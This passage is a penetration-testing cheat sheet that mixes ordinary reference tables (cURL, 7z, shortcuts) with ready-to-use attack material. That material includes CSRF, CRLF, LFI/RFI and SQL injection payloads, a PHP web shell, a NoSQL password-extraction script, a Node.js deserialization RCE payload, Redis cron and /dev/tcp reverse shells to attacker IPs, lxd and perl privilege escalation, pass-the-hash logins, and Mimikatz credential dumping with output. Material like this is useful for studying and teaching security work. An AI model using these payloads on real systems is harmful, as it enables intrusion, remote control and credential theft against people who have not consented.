<script>
 document.getElementById("autosubmit").submit();
</script>
```
### JSON GET
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```
### JSON POST
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```
#### [source](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
--------------------------------------------------------------------------------
# CRLF common payloads

### Add a cookie
`request`
```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```
`response`
```http
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```
### XSS bypass
```http
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
### HTML
```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
### UTF-8 encoded payload
```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```
--------------------------------------------------------------------------------

# Remote File Inclusion (RFI)

#### Common payloads
`php:expect://id`

`php:expect://whoami`

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
```
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```
And evil.txt will look like something like this:
```
<?php echo shell_exec("whoami");?>
```
`Or just get a reverse shell directly like this:`
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
Avoid extentions

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.



-------------------------------------------------------------------------------------------------------------
# Local file inclusion (LFI) payloads

#### normal

```
../../../../../../etc/passwd
```
```
....//....//....//....//....//etc/passwd
```
#### double url encoding
```
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
```

#### with Unicode charecters

```
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8etc/passwd
```

You can also try to use those insted of `/etc/passwd`
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/<site-from-000-df-comment>
/var/www/wordpress/wp-config.php
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled
```

# LFI examples

*akech.xyz/index.php?token=`/etc/passwd%00`*

*akrech.xyz/index.php?page=`../../../../../../etc/passwd`*

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```

### PHP filters

```php
php://filter/convert.base64-encode/resource=
```

```php
php://filter/read=string.rot13/resource=
```

*example input:*

example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php

example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```php
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------
# SQL injection payload list
`Generic SQL Injection Payloads`
```sql
'
''
' or "
-- or # 
' OR '1
' OR 1 -- -
'or 1=1 -- -
" OR "" = "
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
```
------------------------------------------------------------------------------------------------------
## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h examle.com -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

# Nosql

### Grab password with JSON post request
```python
import json
import requests
import string
import sys

url = 'http://10.10.11.139:5000/login'
def login(pw):
	payload = '{ "$regex": "%s" }' % pw
	data = { "user": "admin","password":json.loads(payload) }
	r = requests.post(url,json=data)
	if 'Invalid Password' in r.text:
		return False
	return True

password = '^'
stop = False
while stop == False:
	for i in string.ascii_letters:
		sys.stdout.write(f'\r{password}{i}')
		if login(f'{password}{i}'):
			password += i
			if login(f"{password}$"):
				sys.stdout.write(f'\r{password}\r\n')
				sys.stdout.flush()
				stop = True
				break
			break
```



# Insecure deserialization


## PHP serialization format

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```
When serialized, this object may look something like this:
`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`

This can be interpreted as follows:

    O:4:"User" - An object with the 4-character class name "User"
    2 - the object has 2 attributes
    s:4:"name" - The key of the first attribute is the 4-character string "name"
    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
    b:1 - The value of the second attribute is the boolean value true

## Java serialization format

Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.

Any class that implements the interface java.io.Serializable can be serialized and deserialized. If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream. 


### Node.js deserialization vulnerability payload [RCE]

```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ping attacker.com',function(error, stdout, stderr) { console.log(stdout) });}()"}
```
### Modifying serialized data types
```js
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```



# Windows
----------------------------------------------------------------------------------------------------------
## Basic enumeration on linux and windows
| **Linux**  | **Windows** | **Purpose of command** |
|------------|-------------|------------------------|
|`whoami`|`whoami`|Name of current user
| `uname -a`|`ver`|Operating system
|`ifconfig`|`ipconfig /all`|Network configuration
|`netstat -an`|`netstat -an`|Network connections
|`ps -ef`|`tasklist`|Running processes


## Windows SMB enumeration
* nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```
## MS SQL
* Connect with the db with mssqlclient - github [link](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
```
python3 mssqlclient.py -windows-auth user@10.10.10.125
```

* dump mssql user hash with `responder`

`target`
```
SQL> xp_dirtree "\\<attacker-ip>\anything\"
```
`attacker`
```
root@kali:~# responder -I tun0
```

## xfreerdp
* login with the user hash
```
xfreerdp /u:user /d:domain /pth:011AD41795657A8ED80AB3FF6F078D03 /v:10.5.23.42
```

* login with the user password
```
xfreerdp /u:user /d:domain /p:password /v:10.5.23.42
```
-----------------------------------------------------------------------------------------------------------
# cURL Cheat Sheet

| **Command** | **Description** |
| --------------|-------------------|
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTT basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

## APIs
| **Command** | **Description** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

## Browser DevTools

| **Shortcut** | **Description** |
| --------------|-------------------|
| [`CTRL+SHIFT+I`] or [`F12`] | Show devtools |
| [`CTRL+SHIFT+E`] | Show Network tab |
| [`CTRL+SHIFT+K`] | Show Console tab |

-----------------------------------------------------------------------------------------------------------
# ZIP all in one
### 7z

|  args | value |
|-------|-------|
| `a`   |   add
| `d`   |   delete
| `e`   |   extract
| `l`   |   list
| `t`   |   test
| `u`   |   update
| `x`   |   extract with full paths

#### 7z exit codes

| code | value |
|-------|--------|
| `0`   |    normal (no errors or warnings)
| `1`   |    warning (non-fatal errors)
| `2`   |    fatal error
| `7`   |    bad cli arguments
| `8`   |    not enough memory for operation
| `255` |    process was interrupted

| `command` | `what does` |
------------|--------------|
| `tar cf - directory  7z a -si directory.tar.7z` | to backup a directory 
| `7z -l examle.zip` | list the contents of an archive file
| `7z l -slt examle.zip` | list files with full info
| `7z a -tzip/gzip/bzip2/tar archived.zip path/to/file_or_directory` | archive using a specific archive type
| `7z x archived.zip -so` | extract an archive to stdout
| `7z x archived.zip -opath/to/output` | extract an archive with user-defined output path
| `7z a encrypted.zip -ppassword -mhe=on archived.zip` | encrypt an existing archive (including headers)

-----------------------------------------------------------------------------------------------------------
# Useful find commands example

`find SUID files`
```
find / -user root -perm /4000 2>/dev/null
```
```
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
```
```
find / -type f -name '*.txt' 2>/dev/null
```
```
find / -perm -u=s -type f 2>/dev/null
```
```
getcap -r / 2>/dev/null
```

`find and read all hidden flag.txt `
```
cat $(find / -name flag.txt 2>/dev/null)
```
# Keyboard shortcuts


| Keyboard Shortcut |	Use of the keyboard shortcut |
|-------------------|-------------------------------
| `Ctrl-Alt-t` |	Open a new Terminal
| `Ctrl-d` |	Close a terminal
|`Ctrl-c` |	Cancels the currently running command.
| `Ctrl-l` |	Clears the screen just like clear command
| `Ctrl-a` | Move the cursor to the beginning of the line
| `Ctrl-e` |	Move the cursor to the end of the line
| `Ctrl-f` |	Move the cursor forward by one character
| `Ctrl-b` |	Move the cursor backward by one character
| `Alt-f` | Move the cursor forward by one word
| `Alt-b` | 	Move the cursor backward by one word
| `Ctrl-d`	| Delete the character at the cursor location
| `Ctrl-t` | Exchange the character at the current location with the character at preceding it
| `Ctrl-u` | Erases the complete line
| `Alt-t` |	Exchange the word at the current location with the word at preceding it
| `Alt-l` |	Move the cursor backward by one character
| `Alt-u` |	Convert the characters of a word to lowercase from the current cursor location
| `Alt-b` |	Convert the characters of a word to uppercase from the current cursor location


# Simple bash port scanner

```shell
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```
 
 # Python virtual environment
-------------------------------------------------------------------------------------------------
`install`
```
 sudo apt install python3.9-venv
```
`active` 
```
python3 -m venv env
```
```
┌──(kali㉿bughunt3r)-[~]
└─$ source env/bin/activate
                                                                                                                                                             
┌──(env)─(kali㉿bughunt3r)-[~]
└─$ 
```
 * notice that there is a variable added before the username & hostname.
 * now we are inside of the Python virtual environment.
-------------------------------------------------------------------------------------------------
# Specific permission for specific user
`no permission`
```
setfacl -m u:username:000 myfolder/myfile
```
`read-write-execute`
```
setfacl -m u:username:rwx myfolder/myfile
```
`readonly permission`
```
setfacl -m u:username:r myfolder/myfile
```
`read & write permission`
```
setfacl -m u:username:rw myfolder/myfile
```

--------------------------------------------------------------------------------------------------
# SMB enumeration
## smbclient usage
List shares on a machine using NULL Session
```
smbclient -L
```
List shares on a machine using a valid username + password
```
smbclient -L <target-IP> -U username%password
```
Connect to a valid share with username + password
```
smbclient //<target>/<share$> -U username%password
```
List files on a specific share
```
smbclient //<target>/<share$> -c 'ls' password -U username
```
List files on a specific share folder inside the share
```
smbclient //<target>/<share$> -c 'cd folder; ls' password -U username
```
Download a file from a specific share folder
```
smbclient //<target>/<share$> -c 'cd folder;get desired_file_name' password -U username
```
Copy a file to a specific share folder
```
smbclient //<target>/<share$> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username
```
Create a folder in a specific share folder
```
smbclient //<target>/<share$> -c 'mkdir .\target_folder\new_folder' password -U username
```
Rename a file in a specific share folder
```
smbclient //<target>/<share$> -c 'rename current_file.txt new_file.txt' password -U username
```

## enum4linux usage for smb enumeration
enum4linux - General enumeration - anonymous session
```
enum4linux -a <target>
```
enum4linux - General enumeration - authenticated session
```
enum4linux -a <target> -u <user> -p <pass>
```
enum4linux - Users enumeration
```
enum4linux -u <user> -p <pass> -U <target>
```
enum4linux - Group and members enumeration
```
enum4linux -u <user> -p <pass> -G <target>
```
enum4linux - Password policy
```
enum4linux -u <user> -p <pass> -P <target>
```
## Using nmap for smb enumeration
nmap - Enum Users
```
nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbpass=Pass@1234,smbdomain=workstation -p445 192.168.1.10
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbhash=aad3b435b51404eeaad3b435b51404ee:C318D62C8B3CA508DD753DDA8CC74028,smbdomain=mydomain -p445 192.168.1.10
```
nmap - Enum Groups
```
nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
nmap - Enum Shares
```
nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=LM:NTLM,smbdomain=domain
```
nmap - OS Discovery
```
nmap -p 445 --script smb-os-discovery <target>
```
nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```
Always check for updated list on https://nmap.org/nsedoc/scripts/
map - Brute Force Accounts (be aware of account lockout!)
```
nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
```
### Redis

* SSH

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
2. Write the public key to a file : `(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`
3. Import the file into redis : `cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key`
4. Save the public key to the authorized_keys file on redis server:

```
kali@bughunt3r:~/htb/machines/postman$ echo "FLUSHALL" | redis-cli -h 10.10.10.160
OK                                                                                                        
kali@bughunt3r:~/htb/machines/postman$ cat ~/.ssh/id_rsa.pub | redis-cli -h 10.10.10.160 -x set ssh_key
OK                               
kali@bughunt3r:~/htb/machines/postman$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> config get dbfilename
1) "dbfilename"
2) "authorized_keys"
10.10.10.160:6379> save
OK

```
```
ssh -i ~/.ssh/id_rsa redis@10.10.10.160
```


* `RCE`
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
OK
root@Urahara:~# redis-cli -h 10.10.10.160 config set dir /var/spool/cron/
OK
root@Urahara:~# redis-cli -h 10.10.10.160 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.10.10.160 save
OK
```


-------------------------------------------------------------------------------------------------------
# lxc/lxd Privilege Escalation

```shell
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```shell
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```bash
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```shell
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run these commands on target machine*
```shell
lxc init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

# Perl setuid capability privesc

* if the `perl` has the `cap_setuid+ep` permission set.
* then it means `perl` has capability of changing `UID`.
```shell
akrech@akr3ch:/tmp$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
* create a perl file
```perl
akrech@akr3ch:/tmp$ cat root.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
```
akrech@akr3ch:/tmp$ ./root.pl
root@akr3ch:/tmp# id
uid=0(root) gid=1000(akrech) groups=1000(akrech)
```

# Windows privesc

## metasploit

### local_exploit_suggester
`module`
```
post/multi/recon/local_exploit_suggester
```
`example`

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 40 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[-] 10.10.10.5 - Post interrupted by the console user
```

### mimikatz kiwi

After obtaining a meterpreter shell, we need to ensure that our session is running with SYSTEM level privileges for Mimikatz to function properly.
```
meterpreter > getuid
Server username: WINXP-E95CE571A1\Administrator

meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.
```
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```  
Since this is a 64bit machine, we can proceed to load the Mimikatz module into memory.
```
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
[!] The "kiwi" extension has already been loaded.
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```
* now we can simply use those above commands to privesc our target machine
* here are some examples
`cheds_all`
```
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain    NTLM                              SHA1
--------       ------    ----                              ----
Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   ejfnIWWDojfWEKM
HARIS-PC$      WORKGROUP  (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   (null)
haris-pc$      WORKGROUP  (null)
```
`cheds_msv`
```
meterpreter > creds_msv
[+] Running as SYSTEM                                                                                                                                        
[*] Retrieving msv credentials                                                                                                                               
msv credentials                                                                                                                                              
===============                                                                                                                                              
                                                                                                                                                             
Username       Domain    NTLM                              SHA1                                                                                              
--------       ------    ----                              ----                                                                                              
Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66
```

`password_change`
```
meterpreter > password_change -p ejfnIWWDojfWEKM -P akrech404 -u Administrator
[*] No server (-s) specified, defaulting to localhost.
[+] Success! New NTLM hash: 2081d1de9b8df44ed3a37963ae802d10
```
#### Login with the new password
```
┌──(kali㉿bughunt3r)-[/opt/win]
└─$ python3 psexec.py Administrator:akrech404@10.10.10.40
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.40.....
[*] Found writable share ADMIN$
[*] Uploading file MiONxDaQ.exe
[*] Opening SVCManager on 10.10.10.40.....
[*] Creating service xXQL on 10.10.10.40.....
[*] Starting service xXQL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```
# mimikatz

If you have an LSASS dump, you can use the minidump module
```
mimikatz # sekurlsa::minidump lsass.DMP
```
```
mimikatz # sekurlsa::logonPasswords /full
```
* You can upload mimikatz to a remote machine with smbclient
* Or you can use crackmapexec
* Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.exe
```
crackmapexec IP -u user -p password -M mimikatz
```

* Then you can execute remotely through winexe

```
